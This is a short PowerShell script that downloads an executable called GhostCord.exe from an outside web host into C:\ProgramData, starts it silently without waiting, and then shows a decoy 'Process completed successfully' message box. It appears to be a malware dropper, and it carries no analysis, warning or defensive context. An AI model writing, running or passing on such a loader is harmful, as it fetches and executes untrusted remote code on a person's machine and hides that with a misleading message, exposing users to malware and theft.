# Download and execute EXE file
$exeUrl = "http://toolshare.com.tr/operation/GhostCord.exe"
$destinationPath = "C:\ProgramData\GhostCord.exe"

Invoke-WebRequest -Uri $exeUrl -OutFile $destinationPath

# Start the process asynchronously (don't wait)
Start-Process -FilePath $destinationPath

# Wait 2 seconds
Start-Sleep -Seconds 2

# Show the MessageBox
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show("Process completed successfully.", "Info", "OK", "Information")
